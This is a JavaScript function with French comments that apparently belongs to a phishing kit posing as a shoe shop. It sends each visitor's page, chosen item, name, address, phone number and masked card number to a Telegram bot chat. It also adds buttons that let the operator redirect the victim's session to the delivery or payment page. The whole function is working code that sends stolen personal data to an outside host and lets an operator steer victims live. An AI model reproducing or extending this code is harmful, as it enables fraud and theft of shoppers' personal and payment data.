async function sendTelegramNotif(data){
  if(!TELEGRAM_API || !CHAT_ID) return console.warn('Telegram non configuré.');

  // Création du message clair
  const lines = [
    '🆕 <b>NOUVELLE VISITE</b>',
    `📄 <b>Page:</b> ${data.page || 'Accueil'}`,
  ];

  if(data.pair) lines.push(`👟 <b>Paire choisie:</b> ${data.pair}`);
  if(data.delivery){
    lines.push(`📦 <b>Livraison:</b> ${data.delivery.nom} ${data.delivery.prenom}`);
    lines.push(`🏠 <b>Adresse:</b> ${data.delivery.adresse}`);
    lines.push(`📞 <b>Téléphone:</b> ${data.delivery.telephone}`);
  }
  if(data.card) lines.push(`💳 <b>Carte:</b> ${data.card.panMasked}`);
  
  const text = lines.join('\n');

  // Inline keyboard (les mêmes boutons)
  const keyboard = {
    inline_keyboard: [
      [ { text: '➡️ Aller vers Produit', callback_data: 'redirect|' + data.sessionId + '|/product.html' } ],
      [ { text: '📦 Aller vers Livraison', callback_data: 'redirect|' + data.sessionId + '|/delivery.html' } ],
      [ { text: '💳 Aller vers Paiement', callback_data: 'redirect|' + data.sessionId + '|/payment.html' } ]
    ]
  };

  try {
    const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type':'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: 'HTML',
        reply_markup: keyboard
      })
    });
    const j = await res.json();
    if(!j.ok) console.error('Telegram error:', j);
  } catch(err){
    console.error('Erreur envoi Telegram:', err);
  }
}
